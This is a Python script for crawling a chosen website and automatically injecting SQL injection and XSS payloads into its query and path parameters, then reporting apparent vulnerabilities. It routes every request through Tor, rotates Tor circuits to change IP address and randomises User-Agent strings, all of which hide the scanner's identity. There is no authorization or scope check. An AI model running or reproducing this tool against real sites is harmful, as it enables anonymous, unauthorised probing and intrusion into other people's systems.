import requests
from bs4 import BeautifulSoup
import threading
import argparse
import urllib.parse
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode
import time
import random
import socks
import socket
from stem import Signal
from stem.control import Controller
import os

# Configure Tor proxy
TOR_PROXY = "socks5h://localhost:9050"  # Use "socks5h" for DNS resolution through Tor

# Define vulnerability payloads
PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT null, null --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR '1'='1' --",
        "' OR '1'='1'#",
        "' OR 1=1; --",
        "' OR 1=1;#",
        "' OR '1'='1' /*",
        "' OR '1'='1' -- -",
        "' OR '1'='1' /*",
        "' OR '1'='1' --",
        "' OR '1'='1'#",
        "' OR '1'='1' -- -",
        "' OR '1'='1' /*",
        # Blind SQLi payloads
        "' AND SLEEP(5) --",
        "' AND 1=IF(2>1,SLEEP(5),0) --",
        "' AND 1=IF(2<1,SLEEP(5),0) --"
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>"
    ]
}

# Track tested URLs and parameters to avoid duplicates
tested_urls = set()

# List of UserAgent headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Threading settings
MAX_THREADS = 3  # Limit the number of concurrent threads
DELAY_BETWEEN_REQUESTS = 2  # Delay in seconds between requests
MAX_RETRIES = 3  # Maximum number of retries for failed requests

def get_random_user_agent():
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)

def get_tor_session():
    """Create a requests session routed through Tor."""
    session = requests.Session()
    session.proxies = {
        "http": TOR_PROXY,
        "https": TOR_PROXY
    }
    return session

def rotate_tor_circuit():
    """Rotate Tor circuit to get a new IP address."""
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
    print("[INFO] Rotated Tor circuit.")

def save_urls_to_file(urls, website_name):
    """Save URLs to a text file named after the website."""
    filename = f"{website_name}_urls.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(f"{url}\n")
    print(f"[INFO] Saved {len(urls)} URLs to {filename}")
    return filename

def load_urls_from_file(filename):
    """Load URLs from a text file."""
    if not os.path.exists(filename):
        print(f"[ERROR] File {filename} not found!")
        return []
    with open(filename, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    print(f"[INFO] Loaded {len(urls)} URLs from {filename}")
    return urls

def crawl(start_url, max_depth=2):
    """Crawl the website to find all internal links without recursion."""
    visited = set()
    queue = deque([(start_url, 0)])
    links = []
    
    session = get_tor_session()
    
    while queue:
        url, depth = queue.popleft()
        if url in visited or depth > max_depth:
            continue
        
        visited.add(url)
        try:
            headers = {"User-Agent": get_random_user_agent()}
            response = session.get(url, headers=headers, timeout=30)  # Increased timeout
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                full_url = urllib.parse.urljoin(url, link['href'])
                if full_url.startswith(start_url) and full_url not in visited:
                    queue.append((full_url, depth + 1))
                    links.append(full_url)
                    print(f"[DEBUG] Found link: {full_url}")
        except requests.RequestException as e:
            print(f"[ERROR] Failed to crawl {url}: {e}")
    
    return links

def test_sqli(url):
    """Test SQL Injection in query parameters and path parameters."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    session = get_tor_session()
    
    if query_params:
        for param in query_params:
            for payload in PAYLOADS["SQLi"]:
                # Create a new set of parameters with the payload injected
                test_params = query_params.copy()
                test_params[param] = payload
                
                # Rebuild the URL with the injected payload
                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                
                if test_url in tested_urls:
                    continue  # Skip already tested URLs
                tested_urls.add(test_url)
                
                for attempt in range(MAX_RETRIES):
                    try:
                        headers = {"User-Agent": get_random_user_agent()}
                        start_time = time.time()
                        response = session.get(test_url, headers=headers, timeout=30)  # Increased timeout here too
                        elapsed_time = time.time() - start_time
                        
                        # Check for error-based SQLi
                        if is_vulnerable(response):
                            print(f"[+] SQLi vulnerability found in {param} at {test_url}")
                            break
                        
                        # Check for time-based blind SQLi
                        if "SLEEP" in payload and elapsed_time > 5:
                            print(f"[+] Time-based SQLi vulnerability found in {param} at {test_url}")
                            break
                    except requests.RequestException as e:
                        print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
                        if attempt < MAX_RETRIES - 1:
                            time.sleep(DELAY_BETWEEN_REQUESTS)  # Wait before retrying
                        else:
                            print(f"[ERROR] Max retries reached for {test_url}")
    else:
        # Test for SQLi in path parameters
        for payload in PAYLOADS["SQLi"]:
            test_url = f"{url}/{payload}"
            
            if test_url in tested_urls:
                continue  # Skip already tested URLs
            tested_urls.add(test_url)
            
            for attempt in range(MAX_RETRIES):
                try:
                    headers = {"User-Agent": get_random_user_agent()}
                    start_time = time.time()
                    response = session.get(test_url, headers=headers, timeout=30)  # Increased timeout
                    elapsed_time = time.time() - start_time
                    
                    # Check for error-based SQLi
                    if is_vulnerable(response):
                        print(f"[+] SQLi vulnerability found in path at {test_url}")
                        break
                    
                    # Check for time-based blind SQLi
                    if "SLEEP" in payload and elapsed_time > 5:
                        print(f"[+] Time-based SQLi vulnerability found in path at {test_url}")
                        break
                except requests.RequestException as e:
                    print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(DELAY_BETWEEN_REQUESTS)  # Wait before retrying
                    else:
                        print(f"[ERROR] Max retries reached for {test_url}")

def is_vulnerable(response):
    """Check if the response indicates a vulnerability."""
    errors = {
        "SQL syntax",
        "mysql_fetch",
        "syntax error",
        "unexpected token",
        "error in your SQL",
        "warning: mysql",
    }
    content = response.text.lower()
    return any(error in content for error in errors)

def test_xss(url):
    """Test XSS in query parameters."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    session = get_tor_session()
    
    if query_params:
        for param in query_params:
            for payload in PAYLOADS["XSS"]:
                # Create a new set of parameters with the payload injected
                test_params = query_params.copy()
                test_params[param] = payload
                
                # Rebuild the URL with the injected payload
                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                
                if test_url in tested_urls:
                    continue  # Skip already tested URLs
                tested_urls.add(test_url)
                
                for attempt in range(MAX_RETRIES):
                    try:
                        headers = {"User-Agent": get_random_user_agent()}
                        response = session.get(test_url, headers=headers, timeout=30)  # Increased timeout
                        if payload in response.text:
                            print(f"[+] XSS vulnerability found in {param} at {test_url}")
                            break
                    except requests.RequestException as e:
                        print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
                        if attempt < MAX_RETRIES - 1:
                            time.sleep(DELAY_BETWEEN_REQUESTS)  # Wait before retrying
                        else:
                            print(f"[ERROR] Max retries reached for {test_url}")
    else:
        # Test for XSS in path parameters
        for payload in PAYLOADS["XSS"]:
            test_url = f"{url}/{payload}"
            
            if test_url in tested_urls:
                continue  # Skip already tested URLs
            tested_urls.add(test_url)
            
            for attempt in range(MAX_RETRIES):
                try:
                    headers = {"User-Agent": get_random_user_agent()}
                    response = session.get(test_url, headers=headers, timeout=30)  # Increased timeout
                    if payload in response.text:
                        print(f"[+] XSS vulnerability found in path at {test_url}")
                        break
                except requests.RequestException as e:
                    print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(DELAY_BETWEEN_REQUESTS)  # Wait before retrying
                    else:
                        print(f"[ERROR] Max retries reached for {test_url}")

def test_links(links):
    """Test vulnerabilities in all crawled links."""
    threads = []
    for url in links:
        if threading.active_count() >= MAX_THREADS:
            time.sleep(DELAY_BETWEEN_REQUESTS)  # Wait if too many threads are active
        
        t1 = threading.Thread(target=test_sqli, args=(url,))
        t2 = threading.Thread(target=test_xss, args=(url,))
        threads.append(t1)
        threads.append(t2)
        t1.start()
        t2.start()
        time.sleep(DELAY_BETWEEN_REQUESTS)  # Add delay between requests
    
    for t in threads:
        t.join()

def main():
    # Remove argparse since we're handling input manually now
    print("Choose an option:")
    print("1. Start a new scan")
    print("2. Load URLs from a text file")
    choice = input("Enter your choice (1 or 2): ").strip()

    if choice == "1":
        url = input("Enter the website URL to scan (e.g., http://example.com): ").strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url  # Add default scheme if missing
        website_name = urlparse(url).netloc.replace('.', '_')
        print(f"[*] Starting new scan for {url}")
        links = crawl(url)
        print(f"[*] Found {len(links)} links")
        if links:
            save_urls_to_file(links, website_name)
        test_links(links)
    elif choice == "2":
        filename = input("Enter the path to the text file containing URLs: ").strip()
        links = load_urls_from_file(filename)
        if links:
            print(f"[*] Testing {len(links)} loaded links")
            test_links(links)
        else:
            print("[ERROR] No links to test. Please check the file or start a new scan with option 1.")
    else:
        print("[ERROR] Invalid choice! Please select 1 or 2.")
        return

if __name__ == "__main__":
    main()
